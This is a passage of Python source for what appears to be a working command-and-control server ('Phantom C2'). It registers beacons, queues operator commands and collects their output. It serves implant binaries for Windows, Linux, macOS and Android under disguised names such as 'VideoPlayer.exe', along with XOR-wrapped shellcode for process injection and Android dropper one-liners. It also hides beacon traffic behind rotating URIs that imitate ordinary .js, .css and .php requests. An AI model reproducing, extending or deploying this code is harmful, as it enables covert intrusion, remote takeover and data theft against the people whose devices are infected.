       pre_body: body already read by the malleable catch-all caller."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            return web.Response(status=400)

        encrypted_body = pre_body if pre_body is not None else await request.text()
        if not c2_state.authenticate_beacon(request, encrypted_body):
            logger.warning(f"Unauthenticated result rejected for {beacon_id}")
            return web.Response(status=401, text="Unauthorized")
        decrypted_body = decrypt_data(encrypted_body)

        if not decrypted_body:
            logger.warning(f"Result decryption failed from beacon {beacon_id}")
            return web.Response(status=400)

        try:
            data = json.loads(decrypted_body)
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse result JSON from {beacon_id}. Body: {decrypted_body[:100]}... Error: {e}")
            return web.Response(status=400)
            
        if beacon_id not in c2_state.get_beacons():
            logger.warning(f"Result from unregistered beacon {beacon_id}")
            return web.Response(status=404, text="Unknown beacon")

        task_id = data.get("task_id", "")
        output = data.get("output", "")
        if not isinstance(task_id, str) or not task_id or len(task_id) > 256:
            return web.Response(status=400, text="Invalid task_id")
        if not isinstance(output, str):
            return web.Response(status=400, text="Invalid output")
        if len(output.encode("utf-8", errors="replace")) > MAX_RESULT_OUTPUT_BYTES:
            return web.Response(status=413, text="Result too large")

        c2_state.add_result(beacon_id, task_id, output)
        try:
            from phantom.utils.audit_log import audit_log
            audit_log.append("task_result", beacon_id=beacon_id,
                             task_id=task_id, output_len=len(output))
        except Exception:
            pass

        return web.Response(text="OK")
    except Exception as e:
        logger.error(f"Result error: {e}")
        return web.Response(status=500)


# Filename a browser saves the artifact under. Without a
# Content-Disposition header the browser names the file after the LAST URL
# SEGMENT — `payload_android`, no extension — and a file with no extension
# cannot be run on Windows nor installed on Android. The extension must
# match the real format: PE -> .exe, APK -> .apk, ELF -> none (chmod+run).
_PAYLOAD_DOWNLOADS = {
    "/api/v1/payload": "VideoPlayer.exe",
    "/api/v1/payload_pic": "beacon.bin",
    "/api/v1/payload_linux": "video-player-linux",
    "/api/v1/payload_linux_x86": "video-player-linux-x86",
    "/api/v1/payload_macos": "video-player-macos",
    "/api/v1/payload_android": "VideoPlayer.apk",
    "/api/v1/remote_payload_windows": "remote.exe",
    "/api/v1/remote_payload_linux": "remote-linux",
    "/api/v1/remote_payload_macos": "remote-macos",
    "/api/v1/remote_payload_android": "remote.apk",
}


def payload_download_name(path: str) -> str:
    """Runnable filename for a payload route (used in Content-Disposition)."""
    return _PAYLOAD_DOWNLOADS.get(path, "payload.bin")


async def handle_payload(request: web.Request) -> web.Response:
    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.

    P0-9: the token must travel in the X-Auth-Token HEADER. The legacy
    query string (?auth=) is still accepted for backward compatibility
    with beacons already in the field, but is logged as a deprecation
    (query strings leak into proxy logs, history and telemetry)."""
    try:
        import os
        # Always get current token from utility to stay in sync
        current_auth_token = get_payload_token()

        token = request.headers.get("X-Auth-Token") or request.query.get("auth")
        global_ok = hmac.compare_digest((token or "").encode(),
                                        current_auth_token.encode())
        is_remote = request.path.startswith("/api/v1/remote_payload")

        # Review-3: the Remote Session module is a TIME-BOXED capability.
        # It authenticates with its OWN expiring, revocable session token
        # (issued by `remote-deploy`). The global payload token — which
        # unlocks every payload forever — is accepted only as a documented
        # legacy path, and only while PHANTOM_REMOTE_STRICT is off. A
        # revoked or expired session is refused even if the URL leaked.
        if is_remote:
            session_token = (request.headers.get("X-Remote-Session")
                             or request.query.get("rs") or "")
            sess_ok, why = c2_state.check_remote_session(session_token)
            strict = os.getenv("PHANTOM_REMOTE_STRICT", "0") not in (
                "0", "", "false", "False")
            if not sess_ok:
                if strict or not global_ok:
                    logger.warning(
                        f"Remote payload refused from {request.remote}: {why}")
                    try:
                        from phantom.utils.audit_log import audit_log
                        audit_log.append("remote_payload_denied",
                                         remote=request.remote, reason=why)
                    except Exception:
                        pass
                    return web.Response(status=403, text=f"Forbidden: {why}")
                logger.info(
                    f"DEPRECATED: remote payload served with the GLOBAL "
                    f"payload token to {request.remote} — use a session token "
                    f"('remote-deploy' issues one automatically)")
        elif not global_ok:
            logger.warning(f"Unauthorized payload request from {request.remote}")
            return web.Response(status=403, text="Forbidden: Invalid auth token")
        elif not request.headers.get("X-Auth-Token"):
            logger.info(f"DEPRECATED: payload token in query string from "
                        f"{request.remote} — migrate to X-Auth-Token header")

        # Map route to filename
        platform_map = {
            "/api/v1/payload": "beacon.pe",
            "/api/v1/payload_pic": "beacon.bin",
            "/api/v1/payload_linux": "beacon_linux",
            "/api/v1/payload_linux_x86": "beacon_linux_x86",
            "/api/v1/payload_macos": "beacon_macos",
            "/api/v1/payload_android": "beacon_android",
            "/api/v1/remote_payload_windows": "remote.exe",
            "/api/v1/remote_payload_linux": "remote_linux",
            "/api/v1/remote_payload_macos": "remote_macos",
            "/api/v1/remote_payload_android": "remote.apk",
        }
        filename = platform_map.get(request.path)
        if not filename:
            return web.Response(text="Invalid payload path", status=404)

        # Remote-session module lives in payloads/remote/, beacon in payloads/beacon/
        if request.path.startswith("/api/v1/remote_payload"):
            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "remote", filename)
        else:
            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)

        # beacon.bin is the position-independent loader+PE blob: it is the
        # artifact the migrate command injects into a sacrificial process
        # (same bytes the in-memory dropper executes). It is never written
        # to disk by the requesting beacon.
        # Prefer the statically-linked Linux build: the dynamic build is
        # compiled on the operator box (glibc >= 2.38, e.g. Kali) and dies
        # on most real targets (Debian bookworm/Ubuntu 22.04 ship 2.34-2.36).
        # The static build runs on any glibc/musl. This is the same binary
        # the auto-mode SSH deploy path already uses on purpose.
        is_remote = request.path.startswith("/api/v1/remote_payload")
        if not is_remote and filename == "beacon_linux":
            static_path = os.path.join(
                os.path.dirname(__file__), "..", "payloads", "beacon",
                "beacon_linux_static")
            if os.path.exists(static_path):
                filename = "beacon_linux_static"

        if not os.path.exists(payload_path):
            return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
        
        with open(payload_path, "rb") as f:
            data = f.read()

        # the name the browser saves has to stay RUNNABLE: a PE saved with no
        # extension (or as .mp4) is simply not executable
        download = payload_download_name(request.path)
        return web.Response(
            body=data, content_type="application/octet-stream",
            headers={"Content-Disposition":
                     f'attachment; filename="{download}"'})
    except Exception as e:
        logger.error(f"Payload delivery error: {e}")
        return web.Response(status=500)


async def handle_android_stager(request: web.Request) -> web.Response:
    """GET /s/android — Return a one-liner only to an authenticated caller."""
    try:
        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
        if not hmac.compare_digest((token or "").encode(),
                                   get_payload_token().encode()):
            return web.Response(status=403, text="Forbidden: Invalid auth token")
        from phantom.utils.builder import generate_dropper
        host = server_instance.host if server_instance.host != "0.0.0.0" else request.headers.get("Host", request.url.host)
        if ":" in host:
            host = host.split(":")[0]
        port = server_instance.port or request.url.port or 80
        use_ssl = request.scheme == "https"
        script = generate_dropper("android", host, port, use_ssl=use_ssl)
        return web.Response(text=script, content_type="text/plain")
    except Exception as e:
        logger.error(f"Android stager error: {e}")
        return web.Response(status=500)


async def handle_payload_pic(request: web.Request) -> web.Response:
    """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
    try:
        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
        if not hmac.compare_digest((token or "").encode(),
                                   get_payload_token().encode()):
            logger.warning(f"Unauthorized PIC payload request from {request.remote}")
            return web.Response(status=403, text="Forbidden: Invalid auth token")
        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
        if not os.path.exists(payload_path):
            return web.Response(text="Payload not compiled yet.", status=404)
        with open(payload_path, "rb") as f:
            data = f.read()
        return web.Response(body=data, content_type="application/octet-stream")
    except Exception as e:
        logger.error(f"PIC payload delivery error: {e}")
        return web.Response(status=500)


# ── REST API Handlers (for Telegram bot / external tools) ─────────────────

async def handle_beacons(request: web.Request) -> web.Response:
    """GET /api/v1/beacons — List all registered beacons."""
    return web.Response(text=json.dumps(c2_state.get_beacons(), indent=2), content_type='application/json')

async def handle_queue_task(request: web.Request) -> web.Response:
    """POST /api/v1/queue — Queue a command for a beacon."""
    try:
        body = await request.json()
        beacon_id = body.get('beacon_id', '')
        command = body.get('command', '')
        if not beacon_id or not command:
            return web.Response(status=400, text='{"error":"beacon_id and command required"}', content_type='application/json')
        c2_state.queue_task(beacon_id, command)
        return web.Response(text=json.dumps({'status': 'queued'}), content_type='application/json')
    except TaskPolicyError as e:
        # P1-1: policy refusals are authorization failures, not bad requests
        return web.Response(status=403, text=json.dumps({'error': str(e)}), content_type='application/json')
    except Exception as e:
        return web.Response(status=400, text=json.dumps({'error': str(e)}), content_type='application/json')

async def handle_results_api(request: web.Request) -> web.Response:
    """GET /api/v1/results?beacon_id=X — Get results for a beacon."""
    beacon_id = request.query.get('beacon_id', '')
    if not beacon_id:
        return web.Response(text=json.dumps({'error': 'beacon_id required'}), content_type='application/json')
    results = c2_state.get_results(beacon_id)
    return web.Response(text=json.dumps({'results': results}, indent=2), content_type='application/json')


async def handle_beacon_any(request: web.Request) -> web.Response:
    """Catch-all for malleable URIs.

    The beacon rotates GET/POST paths and randomizes their casing
    (malleable profile). Exact-path routing would 404 most rotated URIs and
    silently drop the session, so any unmatched request carrying X-Beacon-Id
    is routed by CONTENT: GET → check-in, POST with a decrypted body holding
    'task_id' → task result, POST otherwise → telemetry check-in.
    """
    if not request.headers.get("X-Beacon-Id"):
        # Operator API paths that miss exact routing must NOT be swallowed by
        # the malleable catch-all with a bare "C2 OK" — that turns operator
        # errors into silent no-ops. Only genuine malleable-looking URIs get
        # the benign decoy response.
        if request.path.startswith("/api/"):
            return web.Response(status=404, text='{"error": "unknown API endpoint"}',
                                content_type="application/json")
        return web.Response(text="C2 OK")
    if request.method == "GET":
        return await handle_checkin(request)
    body_text = ""
    try:
        body_text = await request.text()   # consumed ONCE here — aiohttp caches it
    except Exception:
        pass
    try:
        if body_text:
            decrypted = decrypt_data(body_text)
            if decrypted and "task_id" in decrypted:
                return await handle_result(request, pre_body=body_text)
    except Exception:
        pass
    return await handle_checkin(request, pre_body=body_text)


# ── Server Lifecycle ───────────────────────────────────────────────────────

def _is_loopback_bind() -> bool:
    """True when the configured listener host is loopback (P0-4 gate). The
    bind-time truth (what the OS accepted) is authoritative: a server that
    bound 127.0.0.1 is loopback regardless of what the config string says.
    Fall back to the configured host string before the site exists."""
    try:
        site = server_site_host()
        if site:
            return site in ("127.0.0.1", "::1", "localhost")
    except Exception:
        pass
    try:
        host = server_instance.host
    except Exception:
        return False
    return host in ("127.0.0.1", "::1", "localhost")


def server_site_host() -> str:
    """The address the live site actually bound ("" when not started)."""
    srv = server_instance
    try:
        if srv.site is not None:
            return getattr(srv.site, "_host", "") or ""
    except Exception:
        pass
    return ""


class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 8080, use_ssl: bool = False,
                 cert_dir: Optional[str] = None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.cert_dir = cert_dir or os.getenv("PHANTOM_MTLS_CERT_DIR", "").strip() or certs_dir()
        self.ssl_context: Optional[ssl.SSLContext] = None
        self.runner: Optional[web.AppRunner] = None
        self.site: Optional[web.TCPSite] = None
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.thread: Optional[threading.Thread] = None
        # Bind/startup failure surface (set by _start_server, read by
        # start(); mirrors the tracker's bind_error contract).
        self.bind_error: Optional[str] = None
        self._started_evt: Optional[threading.Event] = None

    def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Load or generate SSL context; mTLS never downgrades to HTTP."""
        mtls_on = use_mtls()
        if mtls_on and not self.use_ssl:
            logger.error("mTLS requires an HTTPS listener")
            return None
        if not self.use_ssl:
            return None
        cert_dir = self.cert_dir
        os.makedirs(cert_dir, exist_ok=True)
        mtls_on = use_mtls()
        mtls_paths = None
        if mtls_on:
            try:
                from phantom.utils.beacon_auth import ensure_mtls_material
                mtls_paths = ensure_mtls_material(cert_dir, self.host)
                cert_path = mtls_paths["server_cert"]
                key_path = mtls_paths["server_key"]
            except Exception as exc:
                logger.error(f"Failed to prepare mTLS certificates: {exc}")
                return None
        else:
            cert_path = os.path.join(cert_dir, "server.crt")
            key_path = os.path.join(cert_dir, "server.key")

        if not (os.path.exists(cert_path) and os.path.exists(key_path)):

            logger.info("SSL certificates missing. Generating self-signed certificate...")
            try:
                from cryptography import x509
                from cryptography.x509.oid import NameOID
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                import datetime as dt

                # Generate key
                key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                with open(key_path, "wb") as f:
                    f.write(key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption(),
                    ))

                # Generate cert
                subject = issuer = x509.Name([
                    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
                    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
                    x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Phantom C2"),
                    x509.NameAttribute(NameOID.COMMON_NAME, u"phantom-c2.local"),
                ])
                # Generate SANs
                alt_names = [x509.DNSName(u"localhost")]
                if self.host and self.host != "0.0.0.0":
                    try:
                        addr = ipaddress.ip_address(self.host)
                        alt_names.append(x509.IPAddress(addr))
                    except ValueError:
                        alt_names.append(x509.DNSName(str(self.host)))

                cert = x509.CertificateBuilder().subject_name(
                    subject
                ).issuer_name(
                    issuer
                ).public_key(
                    key.public_key()
                ).serial_number(
                    x509.random_serial_number()
                ).not_valid_before(
                    dt.datetime.utcnow()
                ).not_valid_after(
                    dt.datetime.utcnow() + dt.timedelta(days=365)
                ).add_extension(
                    x509.SubjectAlternativeName(alt_names),
                    critical=False,
                ).sign(key, hashes.SHA256())

                with open(cert_path, "wb") as f:
                    f.write(cert.public_bytes(serialization.Encoding.PEM))
                
                logger.success("Self-signed certificate generated successfully.")
            except Exception as e:
                logger.error(f"Failed to generate self-signed certificate: {e}")
                return None

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_path, key_path)
            if mtls_on:
                ca_path = os.getenv("PHANTOM_MTLS_CA", "").strip()
                if not ca_path and mtls_paths:
                    ca_path = mtls_paths["ca_cert"]
                if not ca_path or not os.path.isfile(ca_path):
                    logger.error("mTLS is enabled but the client CA is missing")
                    return None
                context.load_verify_locations(cafile=ca_path)
                context.verify_mode = ssl.CERT_OPTIONAL
                logger.info("mTLS client-certificate verification enabled (CERT_OPTIONAL)")
            return context
        except Exception as e:
            logger.error(f"Failed to load SSL certificates: {e}")
        return None

    def _setup_app(self) -> web.Application:
        app = web.Application(client_max_size=50*1024*1024,
                              middlewares=[mtls_auth_middleware, api_auth_middleware])
        # Check-in: Support malleable URIs
        app.router.add_get("/api/v1/ping", handle_checkin)
        app.router.add_post("/api/v1/ping", handle_checkin)
        app.router.add_get(r"/{path:.*\.js}", handle_checkin)
        app.router.add_post(r"/{path:.*\.js}", handle_checkin)
        app.router.add_get(r"/{path:.*\.css}", handle_checkin)
        app.router.add_post(r"/{path:.*\.css}", handle_checkin)
        app.router.add_get(r"/{path:.*\.ico}", handle_checkin)
        app.router.add_post(r"/{path:.*\.ico}", handle_checkin)
        
        # REST API (Telegram bot / external tools)
        app.router.add_get("/api/v1/beacons", handle_beacons)
        app.router.add_post("/api/v1/queue", handle_queue_task)
        app.router.add_get("/api/v1/results", handle_results_api)        # Results
        app.router.add_post("/api/v1/result", handle_result)
        app.router.add_post(r"/{path:.*\.php}", handle_result)
        app.router.add_post(r"/{path:.*\.aspx}", handle_result)

        # Payload delivery
        app.router.add_get("/api/v1/payload", handle_payload)
        app.router.add_get("/api/v1/payload_linux", handle_payload)
        app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
        app.router.add_get("/api/v1/payload_macos", handle_payload)
        app.router.add_get("/api/v1/payload_android", handle_payload)
        # Remote-session module binaries (standalone GUI takeover companion)
        app.router.add_get("/api/v1/remote_payload_windows", handle_payload)
        app.router.add_get("/api/v1/remote_payload_linux", handle_payload)
        app.router.add_get("/api/v1/remote_payload_macos", handle_payload)
        app.router.add_get("/api/v1/remote_payload_android", handle_payload)
        # One-liner platform stagers
        app.router.add_get("/s/android", handle_android_stager)
        # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
        app.router.add_get("/x", handle_payload_pic)
        app.router.add_get("/", lambda r: web.Response(text="C2 OK"))
        # Malleable catch-alls MUST be registered last: rotated/random-cased
        # beacon URIs land here instead of 404ing (which silently drops the
        # beacon session). Path-based auth for these is handled by the
        # X-Beacon-Id check inside the middleware below.
        app.router.add_get("/{tail:.*}", handle_beacon_any)
        app.router.add_post("/{tail:.*}", handle_beacon_any)
        return app

    def _start_server(self) -> None:
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        evt = self._started_evt

        def _signal() -> None:
            if evt is not None:
                evt.set()

        # Re-create app inside the loop thread
        self.app = self._setup_app()

        # Determine if we should use SSL
        self.ssl_context = self._get_ssl_context()
        if (use_mtls() or self.use_ssl) and self.ssl_context is None:
            logger.error("HTTPS/mTLS listener aborted: TLS material is unavailable")
            self.bind_error = "HTTPS/mTLS listener aborted: TLS material is unavailable"
            self.loop.run_until_complete(self.app.shutdown())
            self.loop.run_until_complete(self.app.cleanup())
            self.loop.stop()
            _signal()
            return

        self.runner = web.AppRunner(self.app)
        self.loop.run_until_complete(self.runner.setup())

        # Bind the CONFIGURED host: 0.0.0.0 when the operator asked for it,
        # the loopback/LAN address otherwise. Binding a host the OS does not
        # own raises OSError right here, INSIDE the thread — captured below
        # into self.bind_error instead of silently killing the thread.
        bind_host = self.host
        self.site = web.TCPSite(self.runner, bind_host, self.port, ssl_context=self.ssl_context)
        try:
            self.loop.run_until_complete(self.site.start())
        except OSError as e:
            # Fail-fast surface: start()/the operator shell reads THIS
            # instead of believing a listener exists (the old behavior
            # left a dead thread and a "started" message on screen).
            self.bind_error = (f"cannot bind {bind_host}:{self.port} — {e} "
                               f"(port already in use or address not local)")
            logger.error(f"C2 listener failed to start: {self.bind_error}")
            try:
                self.loop.run_until_complete(self.runner.cleanup())
            except Exception:
                pass
            self.loop.stop()
            _signal()
            return
        proto = "HTTPS" if self.ssl_context else "HTTP"
        logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
        self.bind_error = None
        _signal()
        self.loop.run_forever()

    def start(self, host: Optional[str] = None, port: Optional[int] = None, use_ssl: Optional[bool] = None) -> None:
        if self.thread and self.thread.is_alive():
            return
        if host:
            self.host = host
        if port:
            self.port = port
        if use_ssl is not None:
            self.use_ssl = use_ssl
        # Re-create SSL context if use_ssl changed. Never silently downgrade
        # a requested HTTPS/mTLS listener to plaintext.
        if use_mtls() and not self.use_ssl:
            logger.error("mTLS requires HTTPS; listener was not started")
            return
        self.ssl_context = self._get_ssl_context()
        if self.use_ssl and self.ssl_context is None:
            logger.error("HTTPS listener refused: TLS material is unavailable")
            return
        self.thread = threading.Thread(target=self._start_server, daemon=True)
        # Handshake: the thread signals the event after the bind attempt, so
        # start() returns knowing the truth — "started" only when the site
        # actually accepted the bind; RuntimeError otherwise.
        self._started_evt = threading.Event()
        self.thread.start()
        self._started_evt.wait(timeout=15)
        if self.bind_error:
            raise RuntimeError(self.bind_error)

    def stop(self) -> None:
        if self.loop and self.runner:
            async def cleanup():
                await self.runner.cleanup()
            try:
                future = asyncio.run_coroutine_threadsafe(cleanup(), self.loop)
                future.result(timeout=2)
            except Exception:
                pass
            self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread:
                self.thread.join(timeout=2)
                self.thread = None
            self.loop = None
            self.runner = None


server_instance = C2Server()
